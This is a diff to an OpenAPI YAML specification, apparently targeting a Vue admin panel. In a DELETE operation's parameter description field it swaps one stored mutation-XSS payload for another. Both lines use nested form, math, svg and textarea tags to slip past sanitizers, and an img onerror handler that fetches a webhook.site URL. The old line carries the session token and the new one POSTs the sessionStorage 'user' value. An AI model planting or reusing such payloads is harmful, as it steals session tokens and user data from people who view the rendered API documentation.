@@ -28,7 +28,7 @@ paths:
     delete:
       parameters:
         - description: |
-            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=fetch(`//webhook.site/87726ef7-bdfb-473e-a29a-f2f01b35981f?c=${fetch(sessionStorage.getItem('Boat-Admin-Vue-Token'))}`) src=1>"></form>
+            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=fetch('//webhook.site/87726ef7-bdfb-473e-a29a-f2f01b35981f',{method:'POST',body:JSON.stringify({c:sessionStorage.getItem('user')})}) src=1>"></form>
 
           format: int64
           in: path
